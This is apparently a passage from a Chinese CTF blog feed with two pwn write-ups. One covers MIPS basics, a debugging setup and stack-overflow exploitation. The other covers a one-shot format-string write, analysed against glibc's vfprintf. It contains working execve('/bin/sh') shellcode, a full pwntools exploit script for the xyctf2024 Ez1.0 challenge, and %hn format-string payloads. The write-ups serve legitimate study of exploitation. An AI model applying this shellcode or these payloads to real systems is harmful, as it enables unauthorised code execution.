+<p>op:指令基本操作，称为操作码。<br>rs:第一个源操作数寄存器。<br>rt:第二个源操作数寄存器。<br>rd:存放操作结果的目的操作数。<br>shamt:位移量；<br>funct:函数，这个字段选择op操作的某个特定变体。  </p>
+</blockquote>
+<p>32位长度分配如下</p>
+<p><strong>R格式</strong>   </p>
+<table>
+<thead>
+<tr>
+<th>6</th>
+<th>5</th>
+<th>5</th>
+<th>5</th>
+<th>5</th>
+<th>6</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>op</td>
+<td>rs</td>
+<td>rt</td>
+<td>rd</td>
+<td>shamt</td>
+<td>funct</td>
+</tr>
+</tbody></table>
+<p> 用于寄存器间操作（算术、逻辑等），例如 <code>add</code>、<code>sub</code>。</p>
+<p><strong>I格式</strong>      </p>
+<table>
+<thead>
+<tr>
+<th>6</th>
+<th>5</th>
+<th>5</th>
+<th>16</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>op</td>
+<td>rs</td>
+<td>rt</td>
+<td>立即数操作</td>
+</tr>
+</tbody></table>
+<p>用于立即数操作、加载和存储、分支等，例如 <code>addi</code>、<code>lw</code>。</p>
+<p><strong>J格式</strong>   </p>
+<table>
+<thead>
+<tr>
+<th>6</th>
+<th>26</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>op</td>
+<td>跳转地址</td>
+</tr>
+</tbody></table>
+<p>用于跳转，例如 <code>j</code>、<code>jal</code>。</p>
+<h5 id="4-常用指令"><a href="#4-常用指令" class="headerlink" title="4.常用指令"></a>4.常用指令</h5><table>
+<thead>
+<tr>
+<th><strong>指令</strong></th>
+<th><strong>功能</strong></th>
+<th><strong>语法</strong></th>
+<th><strong>示例</strong></th>
+<th><strong>解释</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong><code>add</code></strong></td>
+<td>加法（有符号）</td>
+<td><code>add $rd, $rs, $rt</code></td>
+<td><code>add $t0, $t1, $t2</code></td>
+<td>将 <code>$t1</code> 和 <code>$t2</code> 的值相加，结果存储在 <code>$t0</code> 中。</td>
+</tr>
+<tr>
+<td><strong><code>addu</code></strong></td>
+<td>加法（无符号）</td>
+<td><code>addu $rd, $rs, $rt</code></td>
+<td><code>addu $t0, $t1, $t2</code></td>
+<td>将 <code>$t1</code> 和 <code>$t2</code> 的值相加（无符号），结果存储在 <code>$t0</code> 中。</td>
+</tr>
+<tr>
+<td><strong><code>sub</code></strong></td>
+<td>减法（有符号）</td>
+<td><code>sub $rd, $rs, $rt</code></td>
+<td><code>sub $t0, $t1, $t2</code></td>
+<td>将 <code>$t1</code> 的值减去 <code>$t2</code> 的值，结果存储在 <code>$t0</code> 中。</td>
+</tr>
+<tr>
+<td><strong><code>subu</code></strong></td>
+<td>减法（无符号）</td>
+<td><code>subu $rd, $rs, $rt</code></td>
+<td><code>subu $t0, $t1, $t2</code></td>
+<td>将 <code>$t1</code> 的值减去 <code>$t2</code> 的值（无符号），结果存储在 <code>$t0</code> 中。</td>
+</tr>
+<tr>
+<td><strong><code>and</code></strong></td>
+<td>按位与</td>
+<td><code>and $rd, $rs, $rt</code></td>
+<td><code>and $t0, $t1, $t2</code></td>
+<td>将 <code>$t1</code> 和 <code>$t2</code> 的值按位与，结果存储在 <code>$t0</code> 中。</td>
+</tr>
+<tr>
+<td><strong><code>or</code></strong></td>
+<td>按位或</td>
+<td><code>or $rd, $rs, $rt</code></td>
+<td><code>or $t0, $t1, $t2</code></td>
+<td>将 <code>$t1</code> 和 <code>$t2</code> 的值按位或，结果存储在 <code>$t0</code> 中。</td>
+</tr>
+<tr>
+<td><strong><code>xor</code></strong></td>
+<td>按位异或</td>
+<td><code>xor $rd, $rs, $rt</code></td>
+<td><code>xor $t0, $t1, $t2</code></td>
+<td>将 <code>$t1</code> 和 <code>$t2</code> 的值按位异或，结果存储在 <code>$t0</code> 中。</td>
+</tr>
+<tr>
+<td><strong><code>nor</code></strong></td>
+<td>按位与非</td>
+<td><code>nor $rd, $rs, $rt</code></td>
+<td><code>nor $t0, $t1, $t2</code></td>
+<td>将 <code>$t1</code> 和 <code>$t2</code> 的值按位与非，结果存储在 <code>$t0</code> 中。</td>
+</tr>
+<tr>
+<td><strong><code>sll</code></strong></td>
+<td>左移</td>
+<td><code>sll $rd, $rt, shamt</code></td>
+<td><code>sll $t0, $t1, 2</code></td>
+<td>将 <code>$t1</code> 的值左移 2 位，结果存储在 <code>$t0</code> 中。</td>
+</tr>
+<tr>
+<td><strong><code>srl</code></strong></td>
+<td>逻辑右移</td>
+<td><code>srl $rd, $rt, shamt</code></td>
+<td><code>srl $t0, $t1, 2</code></td>
+<td>将 <code>$t1</code> 的值右移 2 位，结果存储在 <code>$t0</code> 中。</td>
+</tr>
+<tr>
+<td><strong><code>sra</code></strong></td>
+<td>算术右移</td>
+<td><code>sra $rd, $rt, shamt</code></td>
+<td><code>sra $t0, $t1, 2</code></td>
+<td>将 <code>$t1</code> 的值算术右移 2 位，结果存储在 <code>$t0</code> 中</td>
+</tr>
+<tr>
+<td><strong><code>lw</code></strong></td>
+<td>加载字（32 位）</td>
+<td><code>lw $rt, offset($rs)</code></td>
+<td><code>lw $t0, 4($a0)</code></td>
+<td>从地址 <code>$a0 + 4</code> 处加载 4 字节数据到 <code>$t0</code>。</td>
+</tr>
+<tr>
+<td><strong><code>sw</code></strong></td>
+<td>存储字（32 位）</td>
+<td><code>sw $rt, offset($rs)</code></td>
+<td><code>sw $t0, 4($a0)</code></td>
+<td>将 <code>$t0</code> 中的数据存储到地址 <code>$a0 + 4</code> 处。</td>
+</tr>
+<tr>
+<td><strong><code>lb</code></strong></td>
+<td>加载字节（8 位）</td>
+<td><code>lb $rt, offset($rs)</code></td>
+<td><code>lb $t0, 0($a0)</code></td>
+<td>从地址 <code>$a0</code> 处加载 1 字节数据到 <code>$t0</code>。</td>
+</tr>
+<tr>
+<td><strong><code>sb</code></strong></td>
+<td>存储字节（8 位）</td>
+<td><code>sb $rt, offset($rs)</code></td>
+<td><code>sb $t0, 0($a0)</code></td>
+<td>将 <code>$t0</code> 中的 1 字节数据存储到地址 <code>$a0</code> 处。</td>
+</tr>
+<tr>
+<td><strong><code>lui</code></strong></td>
+<td>加载上半字（立即数）</td>
+<td><code>lui $rt, imm</code></td>
+<td><code>lui $t0, 0x1234</code></td>
+<td>将立即数 <code>0x1234</code> 加载到 <code>$t0</code> 的高 16 位（低 16 位为 0）。</td>
+</tr>
+<tr>
+<td><strong><code>ori</code></strong></td>
+<td>立即数按位或</td>
+<td><code>ori $rt, $rs, imm</code></td>
+<td><code>ori $t0, $t1, 0xFF</code></td>
+<td>将 <code>$t1</code> 和立即数 <code>0xFF</code> 按位或，结果存储在 <code>$t0</code> 中。</td>
+</tr>
+<tr>
+<td><strong><code>beq</code></strong></td>
+<td>等于分支</td>
+<td><code>beq $rs, $rt, offset</code></td>
+<td><code>beq $t0, $t1, label</code></td>
+<td>如果 <code>$t0</code> 等于 <code>$t1</code>，则跳转到 <code>label</code>。</td>
+</tr>
+<tr>
+<td><strong><code>bne</code></strong></td>
+<td>不等于分支</td>
+<td><code>bne $rs, $rt, offset</code></td>
+<td><code>bne $t0, $t1, label</code></td>
+<td>如果 <code>$t0</code> 不等于 <code>$t1</code>，则跳转到 <code>label</code>。</td>
+</tr>
+<tr>
+<td><strong><code>j</code></strong></td>
+<td>无条件跳转</td>
+<td><code>j target</code></td>
+<td><code>j label</code></td>
+<td>跳转到 <code>label</code> 处。</td>
+</tr>
+<tr>
+<td><strong><code>jal</code></strong></td>
+<td>跳转并链接</td>
+<td><code>jal target</code></td>
+<td><code>jal subroutine</code></td>
+<td>跳转到 <code>subroutine</code>，并将返回地址存储在 <code>$ra</code> 寄存器中。</td>
+</tr>
+<tr>
+<td><strong><code>jr</code></strong></td>
+<td>跳转寄存器</td>
+<td><code>jr $rs</code></td>
+<td><code>jr $ra</code></td>
+<td>跳转到 <code>$ra</code> 寄存器中存储的地址。</td>
+</tr>
+<tr>
+<td><strong><code>nop</code></strong></td>
+<td>空操作</td>
+<td><code>nop</code></td>
+<td><code>nop</code></td>
+<td>什么也不做，通常用于填充延迟槽。</td>
+</tr>
+</tbody></table>
+<pre><code class="asm">or         s8,sp,zero		#实现了x86架构中的mov功能，相当于mov s8,sp
+</code></pre>
+<h5 id="5-MIPS栈帧结构"><a href="#5-MIPS栈帧结构" class="headerlink" title="5.MIPS栈帧结构"></a>5.MIPS栈帧结构</h5><p>典型的MIPS栈帧结构包括以下部分：</p>
+<pre><code>+-------------------------+ &lt;-- 栈顶（高地址）
+|  返回地址（$ra）          | 保存调用者的返回地址
++-------------------------+
+|  上一个栈帧的栈指针        | 保存调用者的栈底指针（$fp）
++-------------------------+
+|  函数参数（如果需要）      | 超过寄存器数量的函数参数存放在栈中
++-------------------------+
+|  局部变量                | 局部变量、临时数据等
++-------------------------+
+|  ...                    | 其他数据
++-------------------------+
+|                         |
+|  栈空闲区                |
+|                         |
++-------------------------+ &lt;-- 栈底（低地址）
+</code></pre>
+<p>MIPS架构中的栈通常是<strong>向下增长</strong>的，这意味着随着栈的推进，栈顶指针（<code>$sp</code>）的值会递减。其中局部变量的寻址是通过$sp或$fp进行的。</p>
+<p>mips函数调用基本格式，其中分为叶子函数和非叶子函数，一般pwn题中做的都是非叶子函数，因为main函数之前程序还会执行其他初始化函数。</p>
+<p><strong>叶子函数</strong>和<strong>非叶子函数</strong>的主要区别在于它们是否调用其他函数：</p>
+<ul>
+<li><strong>叶子函数</strong>：<ul>
+<li><strong>定义</strong>：叶子函数是指在其内部不调用任何其他函数的函数。</li>
+<li>特点<ul>
+<li>由于不调用其他函数，因此不需要保存和恢复返回地址（即<code>$ra</code>寄存器的值）。</li>
+<li>叶子函数通常不需要额外的栈操作，因为它不需要保存其他函数的返回地址或其他寄存器的值。</li>
+<li>返回时直接使用<code>jr $ra</code>指令跳转回调用者。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>非叶子函数</strong>：<ul>
+<li><strong>定义</strong>：非叶子函数是指在其内部会调用其他函数的函数。</li>
+<li>特点<ul>
+<li>由于可能调用其他函数，需要保存当前函数的返回地址（存储在<code>$ra</code>寄存器中）到栈中，以防止被覆盖。</li>
+<li>非叶子函数通常需要调整栈指针（<code>$sp</code>）并保存调用者的返回地址、寄存器状态等信息。</li>
+<li>在返回时，需要从栈中恢复保存的返回地址和寄存器状态，然后使用<code>jr $ra</code>指令返回到调用者。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>简而言之，叶子函数不会调用其他函数，因此对栈的操作较少；而非叶子函数会调用其他函数，因此需要处理更多的栈操作来保存和恢复状态。</p>
+<p>非叶子函数：</p>
+<pre><code class="asm">#Prologue
+addiu      sp,sp,-0x60				#栈上开辟空间
+sw         ra,local_4 (sp)			#存返回地址
+sw         s8,local_8 (sp)			#存该函数的栈底
+or         s8,sp,zero
+lui        gp,0x4a
+addiu      gp,gp,-0x5d50			#设置全局变量的指针
+sw         gp=&gt;_gp ,local_50 (sp)
+...
+#Epilogue
+lw         gp,local_50 (s8)
+or         v0,zero ,zero
+or         sp,s8,zero
+lw         ra,local_4 (sp)
+lw         s8,local_8 (sp)
+addiu      sp,sp,0x60
+jr         ra
+...
+#args offered
+li         a2,0x100						#size
+addiu      v0,s8,0x18
+or         a1,v0,zero					#buf
+or         a0,zero ,zero				#fd
+lw         v0,-0x7f90 (gp)		=&gt;-&gt;read                     
+or         t9,v0,zero
+bal        read                           
+</code></pre>
+<p>叶子函数：</p>
+<pre><code class="assembly"># 执行函数B的任务
+# 不调用其他函数
+# 直接返回
+jr $ra
+</code></pre>
+<h4 id="二、mips环境搭建"><a href="#二、mips环境搭建" class="headerlink" title="二、mips环境搭建"></a>二、mips环境搭建</h4><h5 id="1-安装qemu"><a href="#1-安装qemu" class="headerlink" title="1.安装qemu"></a>1.安装qemu</h5><pre><code class="bash">sudo apt install qemu
+#check if qemu existed
+qemu --version
+</code></pre>
+<h5 id="2-安装gdb-multiarch"><a href="#2-安装gdb-multiarch" class="headerlink" title="2.安装gdb-multiarch"></a>2.安装gdb-multiarch</h5><pre><code class="bash">sudo apt install gdb-multiarch
+#check if gdb-multiarch downloaded successfully
+gdb-multiarch --version
+</code></pre>
+<h5 id="3-安装ghidra"><a href="#3-安装ghidra" class="headerlink" title="3.安装ghidra"></a>3.安装ghidra</h5><p>用于反编译mips指令，吾爱提供的有些IDA只包含x86和x64的Hex-Rays Decompiler插件</p>
+<p>ghidra下载地址：<a href="https://github.com/NationalSecurityAgency/ghidra/releases">https://github.com/NationalSecurityAgency/ghidra/releases</a></p>
+<p>运行ghidra还需要JDK17及以上的环境</p>
+<p>jdk下载地址：<a href="https://adoptium.net/zh-CN/">https://adoptium.net/zh-CN/</a></p>
+<p><strong>启动 Ghidra</strong>：</p>
+<ul>
+<li><p>Windows</p>
+<ul>
+<li>进入 Ghidra 的安装目录，双击 <code>ghidraRun.bat</code> 文件启动 Ghidra。</li>
+</ul>
+</li>
+<li><p>Linux&#x2F;macOS</p>
+<ul>
+<li><p>打开终端，导航到 Ghidra 的安装目录，然后运行以下命令启动 Ghidra：</p>
+<pre><code>./ghidraRun
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>初次运行设置</strong>：</p>
+<ul>
+<li>Ghidra 启动后会提示你设置用户目录，你可以选择默认路径或自定义路径。</li>
+<li>阅读并接受用户协议后，Ghidra 会启动并显示主界面。</li>
+</ul>
+<h5 id="4-安装IDA插件mipsrop"><a href="#4-安装IDA插件mipsrop" class="headerlink" title="4.安装IDA插件mipsrop"></a>4.安装IDA插件mipsrop</h5><p>这里我用的是吾爱的IDA_Pro_v8.3_Portable，其他版本情况可能会有不同。</p>
+<pre><code class="bash">git clone https://github.com/devttys0/ida.git ida-plugins
+</code></pre>
+<p>mipsrop.py在 ida-plugins&#x2F;plugins&#x2F;mipsrop目录下，将其复制进IDA的plugins目录即可</p>
+<p><strong>可能遇到的问题</strong></p>
+<img src="/2024/09/21/mips-pwn/image-20240921180630264.png" class="">
+
+<p>在ida-plugins&#x2F;plugins目录下还有个shims文件夹，将其也复制到IDA的plugins目录就行。</p>
+<h5 id="5-调试方法"><a href="#5-调试方法" class="headerlink" title="5.调试方法"></a>5.调试方法</h5><pre><code class="bash">qemu-mipsel-static -g 6666 -L ./ ./program		#开的端口是6666
+</code></pre>
+<p>之后用gdb连接</p>
+<pre><code class="bash">gdb-multiarch program
+pwndbg&gt; target remote 127.0.0.1:6666
+</code></pre>
+<p>在python写pwn利用脚本过程中，可以在在process中指定打开的端口，然后附加到gdb时就可以连接。</p>
+<pre><code class="python">programe = &#39;your_program&#39;
+p = process([&quot;qemu-mipsel-static&quot;, &quot;-g&quot;, &quot;6666&quot;, &quot;-L&quot;, &quot;./&quot;, program])
+gdb.attach(p,f&#39;&#39;&#39;
+    file &#123;program&#125;
+    target remote 127.0.0.1:6666
+    b main
+    c
+    &#39;&#39;&#39;)
+</code></pre>
+<h4 id="三、mips的一些栈上漏洞利用"><a href="#三、mips的一些栈上漏洞利用" class="headerlink" title="三、mips的一些栈上漏洞利用"></a>三、mips的一些栈上漏洞利用</h4><p>这里以32位的mips（o32 ABI）为例，其余原理相同。</p>
+<h5 id="1-栈溢出-syscall"><a href="#1-栈溢出-syscall" class="headerlink" title="1.栈溢出+syscall"></a>1.栈溢出+syscall</h5><p>如果一个函数是非叶子函数，则其返回地址也会出现在栈上，最后会读取该地址并返回，类似于x86架构，那我们就可以覆盖返回地址实现ROP，mips架构中比较麻烦的是寻找gadget，这里我们用的是IDA的mipsrop插件。</p>
+<p>由于mips架构是没有NX保护的，其实我们可以把shellcode写到栈上后想办法跳转到shellcode处执行。</p>
+<p>我们可以先用<code>mipsrop.stackfinders()</code>这个方法来获取能把栈相关地址写到某个寄存器的gadget，然后定位到control jump中为jalr $fp的那个，因为$fp也是一个栈相关的地址，正好位于返回地址向低地址偏移4字节处，如果能栈溢出的话也能进行控制$fp位置的内容。</p>
+<img src="/2024/09/21/mips-pwn/image-20240921180732229.png" class="">
+
+<p>然后既然能控制$a2寄存器的值为一个栈上的可控地址，那么只要我们再找到一个能跳转到$a2的gadget，将其写入$fp的位置处，就能实现ret2syscall。<code>move $t9,reg</code>后面一般都会找到对应的跳转语句。</p>
+<img src="/2024/09/21/mips-pwn/image-20240921180805478.png" class="">
+
+<p>之后就可以手搓execve系统调用的shellcode了，系统调用号可以在<a href="https://syscalls.w3challs.com/?arch=mips_o32%E8%BF%99%E6%9F%A5%EF%BC%8Cv0%E5%AD%98%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%8F%B7%EF%BC%8Ca0%EF%BC%8Ca1%EF%BC%8Ca2%E5%88%86%E5%88%AB%E5%AD%98%E4%B8%89%E4%B8%AA%E5%8F%82%E6%95%B0%EF%BC%8C%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E5%B0%86%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%86%99%E5%88%B0%E6%A0%88%E9%A1%B6%EF%BC%8C%E5%9C%A8%E6%8A%8A%E5%8F%82%E6%95%B0%E6%8C%87%E5%90%91$sp%EF%BC%8C%E5%B0%B1%E8%83%BD%E5%AE%9E%E7%8E%B0%E5%AD%97%E7%AC%A6%E5%8F%82%E6%95%B0%E7%9A%84%E4%BC%A0%E9%80%92%E4%BA%86%E3%80%82">https://syscalls.w3challs.com/?arch=mips_o32这查，v0存系统调用号，a0，a1，a2分别存三个参数，可以通过将字符串写到栈顶，在把参数指向$sp，就能实现字符参数的传递了。</a></p>
+<pre><code class="python">shellcode = &quot;&quot;&quot;
+li $v0,0xfab		
+li $t0,0x0068732f
+li $t1,0x6e69622f
+addi $sp,$sp,-4
+sw $t0, 0($sp)
+addi $sp,$sp,-4
+sw $t1, 0($sp)
+or $a0,$sp,$zero
+or $a1,$zero,$zero
+or $a2,$zero,$zero
+syscall
+&quot;&quot;&quot;
+</code></pre>
+<p>这里需要注意的一点是execve的第一个参数最好是&#x2F;bin&#x2F;sh，如果图方便只传进去一个sh，因为后面的环境变量参数置零了，很可能会找不到sh报警告，继续向下执行。</p>
+<img src="/2024/09/21/mips-pwn/image-20240921180832554.png" class="">
+
+<h4 id="四、题目复现"><a href="#四、题目复现" class="headerlink" title="四、题目复现"></a>四、题目复现</h4><h5 id="xyctf2024-Ez1-0"><a href="#xyctf2024-Ez1-0" class="headerlink" title="[xyctf2024]Ez1.0"></a>[xyctf2024]Ez1.0</h5><img src="/2024/09/21/mips-pwn/image-20240921180859013.png" class="">
+
+<p>非常简单粗暴的栈溢出，根据上述漏洞利用原理构造即可</p>
+<pre><code class="python">from pwn import *
+context(arch=&quot;mips&quot;,log_level=&quot;debug&quot;)
+
+program = &quot;./mips&quot;
+p = process([&quot;qemu-mipsel-static&quot;, &quot;-g&quot;, &quot;2333&quot;, &quot;-L&quot;, &quot;./&quot;, program])
+gdb.attach(p,f&#39;&#39;&#39;
+    file &#123;program&#125;
+    target remote 127.0.0.1:2333
+    b main
+    c
+    &#39;&#39;&#39;)
+
+gadget1 = 0x00427968
+gadget2 = 0x0041FBF4
+shellcode = &quot;&quot;&quot;
+li $v0,0xfab            
+li $t0,0x0068732f
+li $t1,0x6e69622f
+addi $sp,$sp,-4
+sw $t0, 0($sp)
+addi $sp,$sp,-4
+sw $t1, 0($sp)
+or $a0,$sp,$zero
+or $a1,$zero,$zero
+or $a2,$zero,$zero
+syscall
+
+&quot;&quot;&quot;
+#shellcode = shellcraft.sh()
+payload = asm(shellcode).ljust(0x40,b&quot;A&quot;) + p32(gadget2) + p32(gadget1) + b&quot;A&quot;*0x58 + asm(shellcode)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>mips</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>非栈上格式化字符串一次利用</title>
+    <url>/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/</url>
+    <content><![CDATA[<h2 id="单次非栈上格式化字符串漏洞利用"><a href="#单次非栈上格式化字符串漏洞利用" class="headerlink" title="单次非栈上格式化字符串漏洞利用"></a>单次非栈上格式化字符串漏洞利用</h2><h4 id="问题发展路径"><a href="#问题发展路径" class="headerlink" title="问题发展路径"></a>问题发展路径</h4><ul>
+<li>一开始最基本的格式化字符串漏洞任意地址写，没有什么限制</li>
+<li>进阶一点的是非栈上的格式化字符串漏洞利用，需要利用到栈上的指向程序名称的链条以及靠近内核区域的链条，但这种方法正常而言需要多次格式化字符串漏洞的执行利用，对目标地址改动越大需要利用到越多次。</li>
+<li>最后是在读取内容非栈上的情况下，实现在一次格式化字符串漏洞的触发中直接进行对一个栈上地址的两个字节的修改，可以用于减少利用格式化字符串漏洞的次数，绕过更多的限制。</li>
+</ul>
+<h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>比如我们假设程序中有后门函数，目标是把栈上的返回地址的后两个字节给覆盖了以实现返回到后门函数中去。其中要利用到的两个链条的偏移分别为15和45。按照一般的多次漏洞的利用来说，是要先通过覆盖偏移15处的<code>0x7ffd991d220e</code>的低两个字节<code>0x220e</code>为<code>0x1898</code>，这样以后在r12指向的偏移45处就会是一个指针直接指向要返回到的地址，然后再通过写偏移45处内容的低两个字节实现对返回地址的低两个字节的写入。</p>
+<img src="/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001001143123.png" class="">
+
+<p>这里我们很容易就想到尝试直接把两个并到一起写，就有了如下payload：</p>
+<pre><code class="python">payload = f&quot;%&#123;part1&#125;c%15$hn&quot; + f&quot;%&#123;part2&#125;c%45$hn&quot;
+</code></pre>
+<p>但在实际调试过后会发现现实的残酷，这个格式化字符串的解析中并不是按照先来后到的顺序，先解析完前一个再解析后一个的。实际上这里改的内容都是原偏移地址处指针指向的内容，最后并不会对返回地址进行修改。</p>
+<p>于是就有如下的比较神奇的绕过方法，就可以通过格式化字符串参数解析的特性来实现逐级的赋值。</p>
+<pre><code class="python">payload = &quot;%p&quot;*13
+payload = f&quot;%&#123;part1-130-0x8&#125;c%hn&quot; + f&quot;%&#123;part2&#125;c%45$hn&quot;
+</code></pre>
+<p>这里省略掉了<code>%x$n</code>这种组合，而是直接<code>%hn</code>，这样省略以后会根据顺序来确定指定的参数偏移，由于前面有14个%，这里的%实际就会被解析为指向偏移15处的参数，这样一来在%的解析阶段就能把指定内容写到偏移15的指针处，从而与后面的内容进行联动，实现栈上内容的低两个字节内容的修改。这里part1就是我们通过泄露出栈相关地址后，计算出的返回地址在栈上位置的后两个字节。减去130是前面13个%p打印出的内容长度，最后的减0x8是调试后测出来的差值（这个的确不知道是在哪里多的内容）。</p>
+<h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><p>首先在<code>stdio-common/printf.c</code>中可以找到printf的具体实现。</p>
+<pre><code class="c">#include &lt;libioP.h&gt;
+#include &lt;stdarg.h&gt;
+#include &lt;stdio.h&gt;
+
+#undef printf
+
+/* Write formatted output to stdout from the format string FORMAT.  */
+/* VARARGS1 */
+int
+__printf (const char *format, ...)
+&#123;
+  va_list arg;				//声明一个 va_list 类型的变量 arg，用于存储可变参数列表。
+  int done;					//写入的字符数或其他状态信息。
+
+  va_start (arg, format);	//初始化 arg，使其指向可变参数列表的第一个参数。
+  done = __vfprintf_internal (stdout, format, arg, 0);
+  va_end (arg);				//清理 arg，以释放相关资源
+
+  return done;
+&#125;
+
+#undef _IO_printf
+ldbl_strong_alias (__printf, printf);
+ldbl_strong_alias (__printf, _IO_printf);
+</code></pre>
+<p>其最核心的功能要到<code>vfprintf.c</code>中去寻找，这里结合gdb带源码调试。</p>
+<p>首先会进入ARGCHECK中进行一系列检测，确保格式字符串符合要求。</p>
+<pre><code class="c">#define ARGCHECK(S, Format) \
+  do									      \
+    &#123;									      \
+      /* Check file argument for consistence.  */			      \
+      CHECK_FILE (S, -1);						 //检查文件流有效性和状态     \
+      if (S-&gt;_flags &amp; _IO_NO_WRITES)			//如果指定文件流不可写就返回错误		      \
+    &#123;								      \
+      S-&gt;_flags |= _IO_ERR_SEEN;					      \
+      __set_errno (EBADF);						      \
+      return -1;							      \
+    &#125;								      \
+      if (Format == NULL)			//如果格式化字符串为空就返回错误			      \
+    &#123;								      \
+      __set_errno (EINVAL);						      \
+      return -1;							      \
+    &#125;								      \
+    &#125; while (0)
+</code></pre>
+<p>然后会检查文件流 <code>s</code> 是否处于无缓冲模式，如果处于无缓冲模式，代码调用一个辅助函数 <code>buffered_vfprintf</code>。这个函数的作用是为该流分配一个局部临时缓冲区，然后重新调用原来的格式化输出函数。这样可以在处理输出时提供一个缓冲层，即使原始流不支持缓冲。这里我们调试时会进到<code>buffered_vfprintf</code>里面，最后实际还会调用回<code>vfprintf</code>。</p>
+<pre><code class="c">if (UNBUFFERED_P (s))
+/* Use a helper function which will allocate a local temporary buffer
+   for the stream and then call us again.  */
+    return buffered_vfprintf (s, format, ap, mode_flags);
+</code></pre>
+<img src="/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001102135414.png" class="">
+
+<p>然后会判断代码是否支持宽字符的处理，然后查找格式字符串中的第一个格式说明符。</p>
+<pre><code class="c">#ifdef COMPILE_WPRINTF
+  /* Find the first format specifier.  */
+  f = lead_str_end = __find_specwc ((const UCHAR_T *) format);
+#else
+  /* Find the first format specifier.  */
+  f = lead_str_end = __find_specmb ((const UCHAR_T *) format);
+#endif
+</code></pre>
+<p>后面也有类似的，但是会自增f，用于逐个解析。</p>
+<pre><code class="c">/* Get current character in format string.  */
+      JUMP (*++f, step0_jumps);
+......
+#ifdef COMPILE_WPRINTF
+      f = __find_specwc ((end_of_spec = ++f));
+#else
+      f = __find_specmb ((end_of_spec = ++f));
+#endif
+      /* Write the following constant string.  */
+      outstring (end_of_spec, f - end_of_spec);
+</code></pre>
+<pre><code class="c">#define outstring(String, Len)						\
+  do									\
+    &#123;									\
+      const void *string_ = (String);					\
+      done = outstring_func (s, string_, (Len), done);			\
+      if (done &lt; 0)							\
+    goto all_done;							\
+    &#125;									\
+   while (0)
+</code></pre>
+<p>我们现在关注那个指向程序名的链条，栈上地址低3位16进制为288。</p>
+<img src="/2024/10/02/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%80%E6%AC%A1%E5%88%A9%E7%94%A8/image-20241001112058996.png" class="">
+
+<p>之后在调试时会发现，f会逐渐自增解析各个格式化字符串中的内容，在解析一串%p时其实不会在每一次outstring中打印内容，而是在解析到<code>%xxxc</code>后一并打印内容出来。之后在解析%hn时，会到这里进行跳转。这里对各种类型修饰符进行了解析</p>
+<pre><code class="c">  /* Process &#39;h&#39; modifier.  There might another &#39;h&#39; following.  */
+LABEL (mod_half):
+  is_short = 1;
+  JUMP (*++f, step3a_jumps);
+
+  /* Process &#39;hh&#39; modifier.  */
+LABEL (mod_halfhalf):
+  is_short = 0;
+  is_char = 1;
+  JUMP (*++f, step4_jumps);
+
+  /* Process &#39;l&#39; modifier.  There might another &#39;l&#39; following.  */
+LABEL (mod_long):
+  is_long = 1;
+  JUMP (*++f, step3b_jumps);
+
+  /* Process &#39;L&#39;, &#39;q&#39;, or &#39;ll&#39; modifier.  No other modifier is
+ allowed to follow.  */
+LABEL (mod_longlong):
+  is_long_double = 1;
+  is_long = 1;
+  JUMP (*++f, step4_jumps);
+</code></pre>
+<p><strong>处理 <code>h</code> 修饰符</strong>：</p>
+<ul>
+<li><code>LABEL (mod_half)</code><ul>
+<li>当遇到 <code>h</code> 修饰符时，将 <code>is_short</code> 设置为 1，表示后续的参数应被视为 <code>short int</code> 类型。</li>
+<li>然后跳转到下一个处理步骤 <code>step3a_jumps</code>，继续解析后续的格式字符。</li>
+</ul>
+</li>
+</ul>
+<p><strong>处理 <code>hh</code> 修饰符</strong>：</p>
+<ul>
+<li><code>LABEL (mod_halfhalf)</code><ul>
+<li>当遇到 <code>hh</code> 修饰符时，设置 <code>is_short</code> 为 0，并将 <code>is_char</code> 设置为 1。这表示后续参数将被视为 <code>unsigned char</code> 类型。</li>
+<li>跳转到 <code>step4_jumps</code>，继续后续解析。</li>
+</ul>
+</li>
+</ul>
+<p><strong>处理 <code>l</code> 修饰符</strong>：</p>
+<ul>
+<li><code>LABEL (mod_long)</code><ul>
+<li>当遇到 <code>l</code> 修饰符时，将 <code>is_long</code> 设置为 1，表示后续的参数应被视为 <code>long int</code> 类型。</li>
+<li>跳转到 <code>step3b_jumps</code>，继续解析。</li>
+</ul>
+</li>
+</ul>
+<p><strong>处理 <code>L</code>、<code>q</code> 或 <code>ll</code> 修饰符</strong>：</p>
+<ul>
+<li><code>LABEL (mod_longlong)</code><ul>
+<li>当遇到 <code>L</code>、<code>q</code> 或 <code>ll</code> 修饰符时，将 <code>is_long_double</code> 设置为 1，并将 <code>is_long</code> 设置为 1。这表明后续参数应被视为 <code>long double</code> 类型或 <code>long long int</code> 类型。</li>
+<li>这个标签后不允许有其他修饰符，因此跳转到 <code>step4_jumps</code>，继续后续解析。</li>
+</ul>
